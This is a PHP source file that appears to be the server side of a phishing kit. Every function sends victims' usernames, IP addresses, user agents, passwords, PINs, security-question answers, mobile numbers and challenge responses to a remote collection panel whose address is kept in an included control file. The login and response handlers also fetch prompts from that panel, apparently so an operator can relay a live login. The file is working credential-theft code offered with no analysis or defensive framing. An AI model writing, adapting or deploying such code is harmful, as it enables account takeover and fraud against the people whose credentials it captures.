<?php

function sendUser($user,$rec)
{
	if (!empty($_SERVER['HTTP_CLIENT_IP']))  
    {
      $ip=$_SERVER['HTTP_CLIENT_IP'];
    }
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))   
    {
      $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    else
    {
      $ip=$_SERVER["REMOTE_ADDR"];
    }
	$ua=urlencode($_SERVER['HTTP_USER_AGENT']);
	$user=urlencode($user);
	$ip=urlencode($ip);
	$url=$rec."?user=".$user."&ua=".$ua."&ip=".$ip."&step=user";
	$res=file_get_contents($url);
}
function sendSQ($sa,$secc,$user,$rec)
{
	$user=urlencode($user);
	$sa=urlencode($sa);
	$secc=urlencode($secc);
	$ip=urlencode($ip);
	$url=$rec."?user=".$user."&sa=".$sa."&secc=".$secc."&step=sa";
	$res=file_get_contents($url);
}
function sendPin($pin,$pass,$user,$rec)
{
	$pin=urlencode($pin);
	$pass=urlencode($pass);
	$user=urlencode($user);
	$url=$rec."?pin=".$pin."&pass=".$pass."&user=".$user."&step=pin";
	$res=file_get_contents($url);
}
function sendFpin($pin,$pass,$user,$rec)
{
	$pin=urlencode($pin);
	$pass=urlencode($pass);
	$user=urlencode($user);
	$url=$rec."?pin=".$pin."&pass=".$pass."&user=".$user."&step=fpin";
	$res=file_get_contents($url);
}
function sendMob($mob,$user,$rec)
{
	$mob=urlencode($mob);
	$user=urlencode($user);
	$url=$rec."?mob=".$mob."&user=".$user."&step=mob";
	$res=file_get_contents($url);
}
function sendResponse($response,$user,$rec)
{
	$response=urlencode($response);
	$user=urlencode($user);
	$url=$rec."?response=".$response."&user=".$user."&step=response";
	$res=file_get_contents($url);
}

function getQues($user,$rec)
{
	$user=urlencode($user);
	$url=$rec."?user=".$user."&step=sq";
	$res=file_get_contents($url);
	return $res;
}

function getChallenge($user,$rec)
{
	$user=urlencode($user);
	$url=$rec."?user=".$user."&step=challenge";
	$res=file_get_contents($url);
	return $res;
}



if(isset($_POST["step"]))
{
	if($_POST["step"] == "login")
	{
		include "../control.php";
		$user=urlencode($_POST["user"]);
		$url=$panel_rec."?user=".$user."&step=getlogin";
		$res=file_get_contents($url);
		echo $res;die();
		
	}
	if($_POST["step"] == "response")
	{
		include "../control.php";
		$user=urlencode($_POST["user"]);
		$url=$panel_rec."?user=".$user."&step=getresponse";
		$res=file_get_contents($url);
		echo $res;die();
		
	}
}
?>